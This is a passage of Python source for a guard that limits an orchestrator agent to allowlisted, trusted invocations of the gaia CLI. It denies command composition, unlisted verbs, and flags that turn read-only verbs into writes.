        - (False, reason) otherwise -- categorical, not approvable.
    """
    if not is_orchestrator_role(hook_payload):
        return True, None

    if not command or not command.strip():
        return False, "Empty command is not an allowlisted gaia CLI invocation."

    hazard = _find_composition_hazard(command)
    if hazard is not None:
        return False, (
            f"GAIA CLI ONLY: {hazard} in orchestrator command. The orchestrator "
            f"may run only single, trusted invocations of the gaia CLI -- "
            f"background execution and process substitution both run more "
            f"than the gaia CLI and are denied outright, not approvable."
        )

    decomposed = StageDecomposer().decompose(command)

    if decomposed.substitutions:
        return False, (
            "GAIA CLI ONLY: command substitution detected "
            f"(body/bodies: {decomposed.substitutions!r}). A substitution "
            "runs an additional command to compute a string, even when its "
            "own body would itself be an allowlisted gaia invocation -- "
            "the orchestrator may run only the gaia CLI, exclusively, with "
            "nothing else executing to feed it. Denied outright, not "
            "approvable."
        )

    if not decomposed.stages:
        return False, "GAIA CLI ONLY: command did not decompose into any stage."

    for stage in decomposed.stages:
        allowed, reason = _check_stage(stage)
        if not allowed:
            return False, reason

    return True, None


def _check_stage(stage) -> Tuple[bool, Optional[str]]:
    """Validate one composition component (a ``Stage`` from ``StageDecomposer``).

    Every component of a composition must independently be a trusted,
    absolute-path gaia invocation of an allowlisted verb phrase -- there is
    no shortcut where one legitimate component vouches for the rest.
    """
    args = stage.args
    if not args:
        return False, "GAIA CLI ONLY: empty command component."

    binary = args[0]
    if not is_trusted_gaia_binary(binary):
        return False, (
            f"GAIA CLI ONLY: '{binary}' is not the trusted gaia CLI "
            f"(expected an absolute path whose realpath is the declared "
            f"'gaia' executable of an installed {TRUSTED_PACKAGE_NAME!r} "
            f"package). A bare command name, a relative path, an env-var "
            f"prefix, or a binary no such package declares all fail this "
            f"identity check by design -- see gaia_cli_only_guard.py for "
            f"why. Denied outright, not approvable."
        )

    rest = args[1:]

    # Bare `gaia` (no subcommand at all) and `-h`/`--help` ANYWHERE in the
    # remaining tokens are unconditionally read -- see _is_help_or_bare_stage
    # for why this is provably safe rather than merely convenient, including
    # on an otherwise-mutative verb (`gaia install --help`): argparse's own
    # help action fires eagerly during parsing and exits before any
    # subcommand handler ever runs, so the underlying write never executes
    # either way. Checked BEFORE the allowlist/deny-list so the orchestrator's
    # own contract (mechanical reads, including "what can I even run") is
    # never blocked by the verb it is trying to look up -- and so the error
    # message below, which recommends `gaia --help`, never recommends a
    # command that is itself denied.
    if _is_help_or_bare_stage(rest):
        return True, None

    i = 0
    while i < len(rest) and rest[i].startswith("-"):
        i += 1
    leading_flags = tuple(rest[:i])
    candidate = tuple(rest[i:])

    allowed_phrase = match_allowed_phrase(candidate, ALLOWED_PHRASES)
    if allowed_phrase is not None:
        invalid = _validate_read_flags(candidate, allowed_phrase, leading_flags)
        if invalid is not None:
            return False, invalid
        invalid = _validate_orchestrator_write(candidate, allowed_phrase)
        if invalid is not None:
            return False, invalid
        return True, None

    denied = match_allowed_phrase(candidate, EXPLICITLY_DENIED_PHRASES)
    if denied is not None:
        return False, (
            f"GAIA CLI ONLY: 'gaia {' '.join(denied)}' is explicitly excluded "
            f"from the orchestrator's allowlist (a mutation that belongs to a "
            f"specialist's own governed path, not a bare CLI call). Denied "
            f"outright, not approvable."
        )

    shown = " ".join(candidate) if candidate else "<no subcommand>"
    return False, (
        f"GAIA CLI ONLY: 'gaia {shown}' is not on the orchestrator's verb "
        f"allowlist. Closed by default -- a verb absent from the allowlist "
        f"is denied exactly like one that does not exist yet. Run "
        f"'gaia --help' to see the read lane that IS available: the wall is "
        f"not the map, and the capability you want may already be there "
        f"under another verb. Denied outright, not approvable."
    )


_HELP_LONG_FLAG = "--help"


def _is_help_token(token: str) -> bool:
    """True iff *token* is, or unambiguously abbreviates, `-h`/`--help`.

    Mirrors `_forbidden_flag_hit`'s already-verified-against-argparse
    abbreviation handling (`allow_abbrev` defaults True and gaia's parsers
    never disable it) rather than inventing a second one: `--hel`/`--he`
    parse to the help action exactly as `--fi`/`--f` parse to `--fix` there.
    The `=value` split via `_option_name` also means a token like
    `--description=--help` (a VALUE that merely looks like the flag, verified
    empirically to NOT trigger argparse's help action) correctly does not
    match here either.
    """
    if token == "-h":
        return True
    name = _option_name(token)
    if not name.startswith("--") or len(name) <= 2:
        return False
    return _HELP_LONG_FLAG.startswith(name)


def _is_help_or_bare_stage(rest: Tuple[str, ...]) -> bool:
    """True iff *rest* (the stage's tokens after the trusted binary) is a
    bare invocation or carries `-h`/`--help` anywhere.

    Both are unconditionally safe to allow, on ANY verb, mutative or not:
    argparse's `-h`/`--help` action fires the moment it is encountered during
    parsing and exits the process before any subcommand handler runs (a
    SystemExit either printing help, code 0, or -- if `-h`/`--help` could not
    be consumed as another option's value, which argparse also refuses to do,
    verified empirically -- a parse error, code 2). Either way the write the
    verb would otherwise perform never executes. A bare `gaia` (no tokens at
    all) is the same case: bin/gaia's own dispatcher prints top-level help
    and returns 0 without ever reaching a plugin handler.
    """
    if not rest:
        return True
    return any(_is_help_token(token) for token in rest)


# ---------------------------------------------------------------------------
# Flag-level policy for admitted read verbs (Design decision 4)
# ---------------------------------------------------------------------------
# A phrase is matched by PREFIX, so admitting ("doctor",) admits every token
# that follows it -- including a flag that changes what the verb DOES. This
# table is how a read verb that becomes a writer under one flag is expressed.
_READ_PHRASE_FORBIDDEN_FLAGS: Dict[Tuple[str, ...], FrozenSet[str]] = {
    ("doctor",): frozenset({"--fix"}),
}

# Why each forbidden flag is forbidden, so the denial teaches instead of just
# refusing. A phrase missing from here still denies -- the message is only
# less specific -- so this mapping can never silently weaken the table above.
_READ_PHRASE_FORBIDDEN_FLAG_RATIONALE: Dict[Tuple[str, ...], str] = {
    ("doctor",): (
        "'gaia doctor' is admitted as a read-only diagnostic, and --fix is "
        "the one flag that makes it write: it rewrites the settings file "
        "(_apply_agent_fix) and rebuilds the memory FTS index "
        "(_apply_fts5_backfill), both gated behind 'if args.fix' in "
        "bin/cli/doctor.py. Repairing an installation is a specialist's "
        "governed path, not a coordination read"
    ),
}


def _option_name(token: str) -> str:
    """The option NAME of *token*, with any ``=value`` suffix removed.

    ``--fix=true`` and ``--fix`` are the same option to argparse's eye, and
    ``--workspace=--fix`` is the option ``--workspace`` carrying a value that
    merely LOOKS like a flag -- splitting on the first ``=`` is what keeps
    those three apart.
    """
    return token.split("=", 1)[0]


def _forbidden_flag_hit(token: str, forbidden: FrozenSet[str]) -> Optional[str]:
    """The flag in *forbidden* that *token* would reach, or None.

    Matching is by PREFIX of the forbidden flag, not equality, because
    argparse abbreviates long options (``allow_abbrev`` defaults to True and
    nothing in gaia's parsers turns it off). Measured, not assumed: for
    ``gaia doctor`` both ``--fi`` and ``--f`` parse to ``fix=True``, so an
    equality check on ``"--fix"`` would fail OPEN on the two shortest
    spellings of the very flag it exists to stop.

    Only a ``--`` prefixed token can abbreviate: argparse resolves a
    single-dash token against options that start with THAT token, and no
    long option starts with a single dash, so ``-fix`` is rejected outright
    by argparse and matches nothing here. A bare ``--`` (the end-of-options
    separator) is length 2 and is excluded, or it would prefix every flag.
    """
    name = _option_name(token)
    if not name.startswith("--") or len(name) <= 2:
        return None
    for flag in forbidden:
        if flag.startswith(name):
            return flag
    return None


def _validate_read_flags(
    candidate: Tuple[str, ...],
    phrase: Tuple[str, ...],
    leading_flags: Tuple[str, ...] = (),
) -> Optional[str]:
    """Deny an admitted read phrase carrying a flag that makes it a writer.

    Mirrors :func:`_validate_orchestrator_write`: the phrase allowlist
    establishes authority over the VERB, and this gate withholds the one
    argument that changes what that verb does. Returns None when clean, or
    the denial reason.

    *leading_flags* are the flag tokens that appeared BEFORE the subcommand
    (``gaia --fix doctor``) and were skipped when *candidate* was built. Today
    gaia's root parser rejects such a token outright, so nothing would run --
    but the guard must not depend on a property of another file's parser to
    stay closed, so those tokens are scanned too.
    """
    forbidden = _READ_PHRASE_FORBIDDEN_FLAGS.get(phrase)
    if not forbidden:
        return None

    for token in leading_flags + candidate[len(phrase):]:
        hit = _forbidden_flag_hit(token, forbidden)
        if hit is None:
            continue
        rationale = _READ_PHRASE_FORBIDDEN_FLAG_RATIONALE.get(
            phrase,
            f"'gaia {' '.join(phrase)}' is admitted to the orchestrator's "
            f"lane as a read, and {hit} makes it write",
        )
        return (
            f"GAIA CLI ONLY: '{token}' reaches the forbidden flag {hit} on "
            f"'gaia {' '.join(phrase)}'. {rationale}. The verb itself stays "
            f"allowed -- rerun it without that flag, or dispatch a specialist "
            f"for the repair. Denied outright, not approvable."
        )
    return None


_BRIEF_STATUSES = frozenset({"draft", "open", "in-progress", "closed", "archived"})
_PLAN_STATUSES = frozenset({"draft", "active", "closed"})
_TASK_STATUSES = frozenset({"pending", "done", "skipped"})


def _validate_orchestrator_write(
    candidate: Tuple[str, ...], phrase: Tuple[str, ...]
) -> Optional[str]:
    """Validate the narrow write shapes the orchestrator itself owns.

    The phrase allowlist establishes authority; this second gate prevents an
    interactive editor, a destructive variant, or an unbounded status value
    from riding behind an otherwise-authorized prefix. Gaia's argparse and
    security-tier layers remain authoritative after this structural check.
    """
    if phrase not in ALLOWED_WRITE_PHRASES:
        return None

    args = candidate[len(phrase):]
    reason = (
        "GAIA CLI ONLY: orchestrator write does not match its bounded "
        "coordination shape"
    )

    if phrase == ("brief", "new"):
        valid = "--headless" in args and any(a.startswith("--title=") for a in args)
    elif phrase == ("brief", "edit"):
        valid = bool(args) and not args[0].startswith("-") and "--headless" in args
    elif phrase == ("brief", "set-status"):
        valid = len(args) >= 2 and not args[0].startswith("-") and args[1] in _BRIEF_STATUSES
    elif phrase[:2] == ("brief", "ac"):
        valid = bool(args) and not args[0].startswith("-") and any(a.startswith("--id=") for a in args[1:])
    elif phrase == ("plan", "set-status"):
        valid = len(args) >= 2 and not args[0].startswith("-") and args[1] in _PLAN_STATUSES
    elif phrase == ("task", "set-status"):
        positional = [arg for arg in args if not arg.startswith("-")]
        flags = [arg for arg in args if arg.startswith("-")]
        allowed_flags = {"--json"}
        workspace_flags = [
            arg for arg in flags if arg == "--workspace" or arg.startswith("--workspace=")
        ]
        forbidden_override = any(
            arg == "--override" or arg.startswith("--override=")
            or arg == "--reason" or arg.startswith("--reason=")
            for arg in flags
        )
        unknown_flags = [
            arg for arg in flags
            if arg not in allowed_flags
            and arg != "--workspace"
            and not arg.startswith("--workspace=")
        ]
        # A standalone --workspace consumes the following token, which is not
        # a task positional. Normalize that one documented option before
        # checking the exact BRIEF TASK_ID STATUS shape.
        workspace_pair_valid = True
        if "--workspace" in args:
            wi = args.index("--workspace")
            workspace_pair_valid = wi + 1 < len(args) and not args[wi + 1].startswith("-")
            positional = [
                arg for i, arg in enumerate(args)
                if not arg.startswith("-") and i != wi + 1
            ]
        valid = (
            not forbidden_override
            and not unknown_flags
            and len(workspace_flags) <= 1
            and workspace_pair_valid
            and len(positional) == 3
            and positional[1].isdigit()
            and positional[2] in _TASK_STATUSES
        )
    elif phrase == ("notifications", "ack"):
        valid = (len(args) == 1 and (args[0].isdigit() or args[0] == "--all"))
    else:
        # Memory's curator verbs, the two `scan` spellings and `paths` retain
        # their own mature CLI validation -- there is no coordination-shaped
        # subset of them for this guard to enforce.
        return None

    if valid:
        return None
    return f"{reason}: 'gaia {' '.join(candidate)}'. Denied outright, not approvable."
